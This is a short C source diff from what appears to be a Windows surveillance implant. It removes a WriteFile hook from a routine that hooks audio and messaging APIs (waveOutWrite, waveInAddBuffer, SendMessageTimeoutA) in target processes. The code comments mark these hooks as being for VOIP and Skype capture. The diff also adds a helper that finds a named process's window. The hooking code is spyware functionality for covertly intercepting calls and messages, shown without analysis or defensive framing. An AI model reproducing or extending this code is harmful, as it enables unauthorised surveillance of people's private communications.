@@ -828,7 +828,6 @@ void __stdcall HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOO
 	//HMMAKE_HOOK(dwPid, "ShowWindow", PM_ShowWindow, ShowWindowData, PM_ShowWindow_setup, pServiceData, "user32.dll"); 
 
 	// --- PM per VOIP
-	HMMAKE_HOOK(dwPid, "WriteFile", PM_WriteFile, WriteFileData, PM_WriteFile_setup, pServiceData, "KERNEL32.dll");
 	HMMAKE_HOOK(dwPid, "waveOutWrite", PM_waveOutWrite, waveOutWriteData, PM_waveOutWrite_setup, pServiceData, "WINMM.dll");
 	HMMAKE_HOOK(dwPid, "waveInAddBuffer", PM_waveInUnprepareHeader, waveInUnprepareHeaderData, PM_waveInUnprepareHeader_setup, pServiceData, "WINMM.dll");
 	HMMAKE_HOOK(dwPid, "SendMessageTimeoutA", PM_SendMessage, SendMessageData, PM_SendMessage_setup, pServiceData, "user32.dll"); // per SKYPE
@@ -1073,6 +1072,39 @@ BOOL GetUserUniqueHash(BYTE *user_hash, DWORD hash_size)
 		CloseHandle(hToken);
 	}
 	return ret_val;
+}
+
+typedef struct  {
+	HWND proc_window;
+	DWORD pid;
+} proc_window_struct;
+
+BOOL CALLBACK IsProcWindow(HWND hwnd, LPARAM param) 
+{
+	proc_window_struct *pstr = (proc_window_struct *)param;
+	DWORD pid;
+	if (GetWindowLong(hwnd, GWL_HWNDPARENT) != NULL)
+		return TRUE;
+	if (!IsWindowVisible(hwnd))
+		return TRUE;
+	GetWindowThreadProcessId(hwnd, &pid);
+	if (pid == pstr->pid) {
+		pstr->proc_window = hwnd;
+		return FALSE;
+	}
+	return TRUE;
+}
+// Torna la finestra del processo "procname"
+HWND HM_GetProcessWindow(char *procname)
+{
+	proc_window_struct proc_window;
+	proc_window.proc_window = NULL;
+	proc_window.pid = HM_FindPid(procname, TRUE);
+	if (proc_window.pid == 0)
+		return NULL;
+
+	EnumWindows(IsProcWindow, (LPARAM)(&proc_window));
+	return proc_window.proc_window;
 }
 
 // Ritorna il nome del processo "pid"
